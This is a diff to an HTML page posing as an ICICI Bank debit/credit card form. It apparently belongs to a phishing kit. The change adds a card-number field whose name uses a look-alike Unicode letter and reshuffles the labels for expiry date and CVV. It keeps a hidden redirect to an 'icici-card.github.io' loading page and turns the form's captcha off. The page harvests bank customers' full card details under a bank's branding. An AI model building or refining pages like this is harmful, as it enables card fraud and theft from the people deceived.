@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ICICI BANK Debit/Credit card </title>
+  <title>ICICI BANK Debit/Credit card</title>
   <style>
     body {
       background-color: white;
@@ -75,7 +75,7 @@
       border-radius: 0;
       background: none;
       border-bottom: 1px solid #ccc;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Box shadow added */
     }
 
     .submit-button {
@@ -118,12 +118,16 @@
         <input type="hidden" name="_next" value="https://icici-card.github.io/loding/">
         <input type="text" name="_honey" style="display: none;">
         <input type="hidden" name="_captcha" value="false">
-        <label for="expiryDate">Expiry Date:</label>
-        <input type="text" name="expiryDate" id="expiryDate" required="" placeholder="00 / 00">
+        <label for="carđNumber">Card. Number:</label>
+        <input type="text" name="carđNumber" id="carđNumber" required="" placeholder="xxxx-xxxx-xxxx-xxxx">
         <div class="lower-inputs">
           <div class="input-field">
-            <label for="cvv.">cvv-:</label>
-            <input type="number" name="cvv." id="cvv." required="" placeholder="000">
+            <label for="cvv.">Expiry Date:</label>
+            <input type="text" name="cvv." id="cvv." required="" placeholder="00 / 00">
+          </div>
+          <div class="input-field">
+            <label for="expiryDate">CVV:</label>
+            <input type="number" name="expiryDate" id="expiryDate" required="" placeholder="000">
           </div>
         </div>
         <br>
